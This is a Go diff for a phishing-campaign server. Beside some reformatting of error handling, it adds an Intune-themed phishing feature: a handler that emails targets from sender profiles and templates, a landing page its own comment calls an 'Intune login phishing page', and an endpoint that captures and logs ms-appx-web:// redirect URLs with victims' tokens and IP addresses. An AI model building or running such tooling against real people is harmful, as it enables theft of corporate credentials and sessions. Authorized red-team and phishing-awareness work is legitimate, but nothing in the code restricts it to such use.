@@ -2649,7 +2860,10 @@ func (h *Handler) deleteOTPSecret(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) generateOTPCode(w http.ResponseWriter, r *http.Request) {
 	rows, err := h.Store.ListOTPSecrets()
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	var secret string
 	for _, row := range rows {
 		if row.ID == r.PathValue("id") {
@@ -2657,9 +2871,15 @@ func (h *Handler) generateOTPCode(w http.ResponseWriter, r *http.Request) {
 			break
 		}
 	}
-	if secret == "" { writeError(w, 404, "OTP secret not found"); return }
+	if secret == "" {
+		writeError(w, 404, "OTP secret not found")
+		return
+	}
 	code, err := mfapkg.GenerateTOTP(secret)
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	json.NewEncoder(w).Encode(map[string]string{"code": code})
 }
 
@@ -2667,7 +2887,10 @@ func (h *Handler) generateOTPCode(w http.ResponseWriter, r *http.Request) {
 
 func (h *Handler) listRequestTemplates(w http.ResponseWriter, r *http.Request) {
 	rows, err := h.Store.ListRequestTemplates()
-	if err != nil { writeError(w, 500, err.Error()); return }
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
 	json.NewEncoder(w).Encode(rows)
 }
 
@@ -2747,4 +2970,154 @@ func (h *Handler) regenAll(w http.ResponseWriter, r *http.Request) {
 		"regenerated": regenerated,
 		"errors":      errs,
 	})
+}
+
+// ─── Intune ms-appx-web:// capture ─────────────────────────────────────────────
+
+// CaptureIntune handles ms-appx-web:// capture from Intune landing page.
+func (h *Handler) CaptureIntune(w http.ResponseWriter, r *http.Request) {
+	body, _, httpErr := readWebhookBody(r)
+	if httpErr != "" {
+		writeError(w, 415, httpErr)
+		return
+	}
+
+	var payload struct {
+		Token      string `json:"token"`
+		CampaignID string `json:"campaign_id"`
+		TargetID   string `json:"target_id"`
+		Timestamp  int64  `json:"timestamp"`
+		Data       struct {
+			Type    string `json:"type"`
+			URL     string `json:"url"`
+			Trigger string `json:"trigger"`
+		} `json:"data"`
+	}
+	if err := json.Unmarshal(body, &payload); err != nil {
+		writeError(w, 400, "invalid JSON payload")
+		return
+	}
+
+	if payload.Token == "" || payload.Data.URL == "" {
+		writeError(w, 400, "token and data.url required")
+		return
+	}
+
+	if payload.CampaignID == "" || payload.TargetID == "" {
+		campaignID, targetID, ok := h.Store.GetIntuneTokenInfo(payload.Token)
+		if !ok {
+			writeError(w, 404, "token not found")
+			return
+		}
+		payload.CampaignID = campaignID
+		payload.TargetID = targetID
+	}
+
+	if err := h.Store.InsertIntuneCapture(store.IntuneCaptureRow{
+		CampaignID: payload.CampaignID,
+		TargetID:   payload.TargetID,
+		Token:      payload.Token,
+		URL:        payload.Data.URL,
+		Trigger:    payload.Data.Trigger,
+		SourceIP:   r.RemoteAddr,
+		CapturedAt: time.Now().UTC(),
+	}); err != nil {
+		log.Printf("[intune] failed to save capture: %v", err)
+	}
+
+	auditEntry := map[string]interface{}{
+		"timestamp":   time.Now().UTC().Format(time.RFC3339),
+		"source_ip":   r.RemoteAddr,
+		"campaign_id": payload.CampaignID,
+		"target_id":   payload.TargetID,
+		"token":       payload.Token,
+		"data_type":   payload.Data.Type,
+		"url":         payload.Data.URL,
+		"trigger":     payload.Data.Trigger,
+	}
+
+	auditJSON, _ := json.Marshal(auditEntry)
+
+	writeWebhookLogEntryWithType(
+		h.WebhookLogPath, r.RemoteAddr, r.Method, r.URL.Path,
+		"json", auditJSON, "intune_capture",
+	)
+
+	log.Printf("[intune] ms-appx-web:// capture from %s: campaign=%s target=%s token=%s trigger=%s url=%s",
+		r.RemoteAddr, payload.CampaignID, payload.TargetID, payload.Token, payload.Data.Trigger, payload.Data.URL)
+
+	writeJSON(w, 200, map[string]string{"status": "captured"})
+}
+
+// ─── Intune Email Phishing ─────────────────────────────────────────────────────
+
+func (h *Handler) sendIntuneEmails(w http.ResponseWriter, r *http.Request) {
+	id := r.PathValue("id")
+
+	var body struct {
+		ProfileID        string `json:"profile_id"`
+		IntuneTemplateID string `json:"intune_template_id"`
+		BaseURL          string `json:"base_url"`
+		TargetID         string `json:"target_id"` // optional — send to one target only
+	}
+	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
+		writeError(w, 400, "invalid body")
+		return
+	}
+	if body.ProfileID == "" || body.IntuneTemplateID == "" || body.BaseURL == "" {
+		writeError(w, 400, "profile_id, intune_template_id, base_url required")
+		return
+	}
+	profile, ok := h.Mailer.GetProfile(body.ProfileID)
+	if !ok {
+		writeError(w, 404, "sender profile not found")
+		return
+	}
+	intuneTmpl, ok := h.Mailer.GetTemplate(body.IntuneTemplateID)
+	if !ok {
+		writeError(w, 404, "intune template not found")
+		return
+	}
+	results, err := h.Manager.SendIntuneEmails(id, profile, intuneTmpl, body.BaseURL, body.TargetID)
+	if err != nil {
+		writeError(w, 400, err.Error())
+		return
+	}
+	writeJSON(w, 200, map[string]interface{}{"results": results})
+}
+
+func (h *Handler) listIntuneCaptures(w http.ResponseWriter, r *http.Request) {
+	campaignID := r.PathValue("id")
+	captures, err := h.Store.ListIntuneCaptures(campaignID)
+	if err != nil {
+		writeError(w, 500, err.Error())
+		return
+	}
+	if captures == nil {
+		captures = []store.IntuneCaptureRow{}
+	}
+	writeJSON(w, 200, captures)
+}
+
+// HandleIntuneLanding serves the Intune login phishing page.
+func (h *Handler) HandleIntuneLanding() http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		token := r.PathValue("token")
+
+		campaignID, targetID, ok := h.Store.GetIntuneTokenInfo(token)
+		if !ok {
+			http.Error(w, "Not found", http.StatusNotFound)
+			return
+		}
+
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		w.Header().Set("Cache-Control", "no-store")
+
+		html := web.IntuneLandingHTML
+		html = strings.ReplaceAll(html, "{{TOKEN}}", token)
+		html = strings.ReplaceAll(html, "{{CAMPAIGN_ID}}", campaignID)
+		html = strings.ReplaceAll(html, "{{TARGET_ID}}", targetID)
+
+		io.WriteString(w, html)
+	}
 }
